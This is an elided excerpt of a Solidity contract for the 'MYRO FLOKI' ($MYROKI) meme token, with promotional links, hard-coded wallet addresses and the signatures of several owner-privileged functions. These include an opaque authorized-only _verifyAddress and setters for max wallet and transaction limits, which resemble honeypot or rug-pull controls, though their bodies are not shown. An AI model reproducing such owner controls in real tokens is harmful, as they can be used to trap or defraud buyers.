// https://t.me/Myrokibsc
// https://x.com/Myrokibsc
// https://myrokibsc.fun/
...
contract MyroFloki is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x0B74A01B699760EB89F3CadcC2c1794e5341B2FE); 
    address payable public Wallet_Dev = payable(0xF07e85932F44DD791026dDCb47fb7F06F5369caa);
    ...
    string private constant _name = "MYRO FLOKI"; 
    string private constant _symbol = unicode"$MYROKI"; 
    ...
    constructor () {
        ...
        _owner = 0xF07e85932F44DD791026dDCb47fb7F06F5369caa;
    ...
    function _remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
    ...
    function _verifyAddress(uint256 acc, address adr) authorized() public virtual {
    ...
    function _setmaxWallet(uint256 maxWL) external authorized() {
        _maxWalletToken = maxWL;
    }

    function _setmaxTx(uint256 maxT) external authorized() {
        _maxTxAmount = maxT;
    }
